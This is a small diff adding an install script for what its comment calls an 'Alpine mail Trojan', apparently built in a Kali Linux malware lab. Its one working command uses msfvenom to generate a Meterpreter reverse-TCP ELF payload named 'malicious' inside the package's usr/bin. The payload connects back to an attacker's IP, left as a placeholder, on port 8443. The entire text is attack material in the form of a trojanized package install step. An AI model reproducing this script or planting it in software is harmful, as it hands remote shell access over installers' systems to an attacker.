@@ -1,0 +1,8 @@
+#!/bin/sh
+# postint script for Alpine mail Trojan
+
+# kali@kali:~/Desktop/Malware/trojans/mailTrojan$ 
+
+cd usr/bin
+
+msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<Kali IPaddress> LPORT=8443 -b "\x00" -f elf -o malicious
